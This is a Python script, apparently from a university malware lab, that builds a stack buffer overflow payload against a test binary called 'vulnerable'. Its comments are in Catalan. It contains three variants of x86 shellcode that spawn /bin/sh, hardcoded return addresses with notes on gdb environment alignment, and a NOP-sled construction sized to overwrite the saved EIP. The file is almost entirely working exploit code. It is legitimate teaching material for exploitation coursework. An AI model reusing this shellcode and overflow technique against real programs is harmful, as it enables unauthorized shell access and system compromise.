#!/usr/bin/python3

import sys

# ------------------------- SHELLCODE ------------------------- #

# meva, va en assembler i en shellcodetest, no va en vulnerable
payload = b"\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x5b\x31\xc9\x31\xd2\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# pdf, funciona en vulnerable, funciona en shellcodetest, no va en assembler
payload = b"\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"

# internet, funciona en vulnerable, funciona en shellcodetest, no va en assembler
#payload = b"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"

# ------------------------- RETURN ADDR ------------------------- #

# debugger with LINES and COLUMNS in show env (disable with unset env <NAME>)
# check env in the gdb with env - gdb ./program
# check env in the shell with env - ./program

# Funciona als dos llocs sense tocar env. Si no va en debug, esborrar lines i columns
# env -i PWD="/home/algafix/malware/lab2" SHELL="/bin/bash" SHLVL=0 /home/algafix/malware/lab2/vulnerable_debug $(/home/algafix/malware/lab2/payload_gen.py)
# env -i PWD="/home/algafix/malware/lab2" SHELL="/bin/bash" SHLVL=0 gdb /home/algafix/malware/lab2/vulnerable_debug
r_addr = b"\x2c\xdd\xff\xff" # 0xffffdd2c 

# gdb sense linesni columns i _ com a shell. Pasa algo raro amb l'alineacio crec
#r_addr = b"\xde\xcd\xff\xff" #ffffcdde

# funciona important lines i columns al shell, fitxer env_vars amb les que funciona. $_ fa coses rares pero chuta
#r_addr = b"\x9c\xcd\xff\xff"

# ------------------------- OUTPUT CRAFT ------------------------- #

payload = payload + r_addr
l_payload = len(payload)

# We have 108 bytes between the start of the buffer and the start of the EIP
# EIP is 4 bytes, so 112 bytes of payload

final_string = (b"\x90"*(112-l_payload) + payload)
sys.stdout.buffer.write(final_string)